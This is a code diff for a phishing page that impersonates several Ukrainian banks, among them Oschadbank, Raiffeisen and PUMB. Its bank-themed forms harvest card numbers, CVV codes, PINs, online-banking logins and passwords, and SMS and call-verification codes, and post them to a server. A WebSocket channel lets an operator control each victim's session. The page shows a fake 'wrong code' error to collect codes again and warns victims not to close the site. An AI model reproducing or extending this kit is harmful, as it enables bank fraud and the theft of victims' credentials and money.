@@ -16,6 +16,7 @@
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
+        
         #form-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; visibility: hidden; transform: scale(1.05);
@@ -74,8 +75,10 @@
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
         .btn:active { transform: translateY(0) scale(0.97); }
         body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
+        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
+        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
+        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
@@ -116,7 +119,6 @@
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('DOM loaded, rendering banks...');
     const urlParams = new URLSearchParams(window.location.search);
     const ref = urlParams.get('ref') || 'unknown';
     localStorage.setItem('referrer', ref);
@@ -150,7 +152,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': {
             name: 'Ощадбанк',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/6/6c/Oschadbank_%28uk%29.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
             theme: 'oschadbank',
             steps: [
                 { type: 'phone', title: 'Введіть номер телефону' },
@@ -159,49 +161,39 @@ document.addEventListener('DOMContentLoaded', () => {
         },
         'raiffeisen': {
             name: 'Райффайзен',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/7/7d/Raiffeisen_Bank_International_Logo.svg',
+            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
             theme: 'raiffeisen',
             steps: specialFlowSteps,
             special: true
         },
         'vostok': {
             name: 'Восток',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/2/2b/Bank_Vostok_Logo.png',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
             theme: 'vostok',
             steps: specialFlowSteps,
             special: true
         },
         'izibank': {
             name: 'Izibank',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Izibank_Logo.png',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
             theme: 'izibank',
             steps: specialFlowSteps,
             special: true
         },
         'ukrsib': {
             name: 'Укрсиб',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/9/9f/Ukrsibbank_Logo.png',
+            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
             theme: 'ukrsib',
             steps: specialFlowSteps,
             special: true
         }
     };
 
-    console.log('bankFlows:', bankFlows);
     const bankGrid = document.querySelector('.bank-grid');
-    try {
-        bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
-            const bank = bankFlows[id];
-            console.log(`Rendering bank: ${bank.name}`);
-            return `<a href="#" class="bank-item" data-bank="${id}">
-                <img src="${bank.logoUrl}" alt="${bank.name}" onerror="this.style.display='none'">
-                <span class="bank-name">${bank.name}</span>
-            </a>`;
-        }).join('');
-    } catch (e) {
-        console.error('Error rendering banks:', e);
-        bankGrid.innerHTML = '<p style="color: red; text-align: center;">Помилка завантаження банків</p>';
-    }
+    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+        const bank = bankFlows[id];
+        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
+    }).join('');
 
     if (isBanned) {
         document.querySelectorAll('.bank-item').forEach(item => item.style.pointerEvents = 'none');
@@ -209,42 +201,34 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function connectWebSocket() {
-        console.log('Connecting WebSocket...');
-        ws = new WebSocket(`wss://${window.location.host}/ws`);
+        ws = new WebSocket(`wss://${window.location.host}`);
         ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send(JSON.stringify({ type: 'register', sessionId }));
-            setInterval(() => {
-                if (ws.readyState === WebSocket.OPEN) ws.send('ping');
-            }, 30000);
+            ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
         };
         ws.onmessage = (event) => {
-            const data = event.data;
-            if (data === 'pong') return;
-            console.log('WebSocket message:', data);
-            const command = JSON.parse(data);
+            const command = JSON.parse(event.data);
             handleServerCommand(command);
         };
-        ws.onclose = () => console.log('WebSocket closed');
+        ws.onclose = () => {
+            setTimeout(connectWebSocket, 3000);
+        };
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
 
     connectWebSocket();
 
-    async function sendDataToServer(data, isFinal, bankTheme = '') {
-        console.log('Sending to server:', data, isFinal);
+    async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
         try {
             const response = await fetch('/api/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId,
-                    bankName: activeBankData.name,
-                    bankTheme,
-                    isFinalStep: isFinal,
+                body: JSON.stringify({ 
+                    sessionId, 
+                    bankName: activeBankData.name, 
+                    isFinalStep: isFinal, 
                     referrer: localStorage.getItem('referrer') || 'unknown',
-                    ...collectedData
+                    ...collectedData 
                 }),
             });
             console.log('Server response:', await response.json());
@@ -262,31 +246,18 @@ document.addEventListener('DOMContentLoaded', () => {
             let key = input.id;
             let value = input.value;
             if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
-            if (key === 'card' || key === 'card_confirm' || key === 'login' || key === 'password' || key === 'pin' || key === 'call_code_input') value = value.replace(/\s/g, '');
+            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
             data[key] = value;
         });
 
         const step = activeBankData.steps[currentStepIndex];
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
 
-        if (activeBankData.theme === 'oschadbank' && (step.type === 'card' || step.type === 'lk_oschad')) {
+        if (activeBankData.theme === 'oschadbank' && step.type === 'pin') {
             isFinalStep = true;
-            sendDataToServer(data, isFinalStep, activeBankData.theme);
-            showLoadingSpinner();
-            return;
         }
 
-        if (step.type.startsWith('lk_') || step.type === 'call_oschad') {
-            sendDataToServer(data, true, activeBankData.theme);
-            if (step.type === 'lk_oschad') {
-                showLoadingSpinner();
-            } else {
-                showWaitingScreen();
-            }
-            return;
-        }
-
-        sendDataToServer(data, isFinalStep, activeBankData.theme);
+        sendDataToServer(data, isFinalStep);
 
         if (activeBankData.special && step.type === 'card_simple') {
             showWaitingScreen();
@@ -305,24 +276,6 @@ document.addEventListener('DOMContentLoaded', () => {
         modalTitle.textContent = 'Очікуємо';
         stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
         modalFooter.style.display = 'none';
-    }
-
-    function showLoadingSpinner() {
-        modalTitle.textContent = 'Очікуйте, сервер перевантажений';
-        stepContent.innerHTML = `<div class="loading-spinner"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" alt="Loading"></div>`;
-        modalFooter.style.display = 'none';
-        setTimeout(() => {
-            showWaitingScreen();
-        }, 5000); // Спиннер на 5 сек
-    }
-
-    function showCodeError() {
-        modalTitle.textContent = 'Вказано Невірний код';
-        stepContent.innerHTML = `<p style="text-align:center; color: var(--danger-color);">Вказано Невірний код</p><div class="sms-form">${currentSmsText}</div>`;
-        modalFooter.style.display = 'flex';
-        nextBtn.textContent = 'Відправити';
-        nextBtn.id = 'submit-sms-code';
-        nextBtn.addEventListener('click', submitSmsCode, { once: true });
     }
 
     function handleBackStep() {
@@ -363,19 +316,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.target.value = value;
             });
         }
-        const pinInput = document.getElementById('pin') || document.querySelector('.custom-input');
-        if (pinInput) {
-            // Логика для PIN клавиатуры в renderStep
-        }
-        const callCodeInput = document.getElementById('call_code_input');
-        if (callCodeInput) {
-            callCodeInput.maxLength = 4;
-        }
     }
 
     function validateCurrentStep() {
         let isValid = true;
-        const inputs = stepContent.querySelectorAll('.input-field:not(.custom-input)');
+        const inputs = stepContent.querySelectorAll('.input-field');
         inputs.forEach(input => {
             const errorContainer = input.nextElementSibling;
             input.classList.remove('invalid');
@@ -392,13 +337,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 case 'card_confirm': requiredLength = 16; break;
                 case 'card-expiry': requiredLength = 4; break;
                 case 'card-cvv': requiredLength = 3; break;
-                case 'pin':
-                case 'login':
-                case 'password': requiredLength = input.value.length > 0 ? 0 : 1; break;
-                case 'call_code_input': requiredLength = 4; break;
+                case 'pin': requiredLength = 4; break;
             }
 
-            if (requiredLength > 0 && value.length < requiredLength || (requiredLength === 1 && !input.value.trim())) {
+            if (requiredLength > 0 && value.length < requiredLength) {
                 isValid = false;
                 input.classList.add('invalid');
                 if (errorContainer) {
@@ -427,19 +369,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                 break;
             case 'pin':
-                if (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank') {
-                    html = `
-                        <p style="text-align:center;">Введіть пароль</p>
-                        <div class="pin-dots" id="pin-dots"></div>
-                        <input type="password" class="custom-input" id="pin" maxlength="4">
-                        <div class="pin-keyboard" id="pin-keyboard">
-                            ${[1,2,3,4,5,6,7,8,9,0].map(num => `<button type="button" data-pin="${num}">${num}</button>`).join('')}
-                            <button type="button" data-pin="" style="grid-column: span 2;">Видалити</button>
-                        </div>
-                    `;
-                } else {
-                    html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
-                }
+                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                 break;
             case 'call_code':
                 html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
@@ -455,7 +385,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'lk_oschad':
                 html = `
-                    <p style="text-align:center;">Для входу у введіть логін або номер телефону</p>
+                    <p style="text-align:center;">Авторизуйтесь через Ощад24</p>
                     <div class="auth-toggle">
                         <label><input type="radio" name="auth-type" value="phone" checked> Номер телефону</label>
                         <label><input type="radio" name="auth-type" value="login"> Логін</label>
@@ -478,7 +408,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 `;
                 break;
             case 'lk_vostok':
-                html = `<p style="text-align:center;">Вхід у Vostok Bank</p><div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12" value=""></div><div class="error-message" style="margin-left: 55px;"></div></div>${generateInputHTML('password', 'Пароль', 'password')}`;
+                html = `<p style="text-align:center;">Вхід у Vostok Bank</p><div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>${generateInputHTML('password', 'Пароль', 'password')}`;
                 break;
             case 'lk_izibank':
                 html = `
@@ -507,7 +437,6 @@ document.addEventListener('DOMContentLoaded', () => {
         nextBtn.id = 'next-btn';
         nextBtn.removeEventListener('click', submitSmsCode);
 
-        // Переключение формы ЛК
         const authToggle = document.querySelectorAll('input[name="auth-type"]');
         if (authToggle.length > 0) {
             const authForm = document.getElementById('auth-form');
@@ -583,14 +512,6 @@ document.addEventListener('DOMContentLoaded', () => {
             renderStep();
         });
     });
-
-    const body = document.body;
-    const formHeaderLogo = document.getElementById('form-header-logo');
-    const modalTitle = document.getElementById('modal-title');
-    const stepContent = document.getElementById('modal-step-content');
-    const modalFooter = document.querySelector('.modal-footer');
-    const nextBtn = document.getElementById('next-btn');
-    const backBtn = document.getElementById('back-btn');
 
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
@@ -706,19 +627,19 @@ document.addEventListener('DOMContentLoaded', () => {
         if (!code.trim()) {
             const errorContainer = document.getElementById('sms-error-container');
             if (errorContainer) {
-                errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+                 errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
             }
             return;
         }
-
+        
         console.log('Submitting SMS code:', code);
 
         try {
             await fetch('/api/sms', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId,
+                body: JSON.stringify({ 
+                    sessionId, 
                     code,
                     referrer: localStorage.getItem('referrer') || 'unknown'
                 }),
@@ -729,6 +650,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         showCodeError();
+        
         codeInput.value = '';
     }
 });
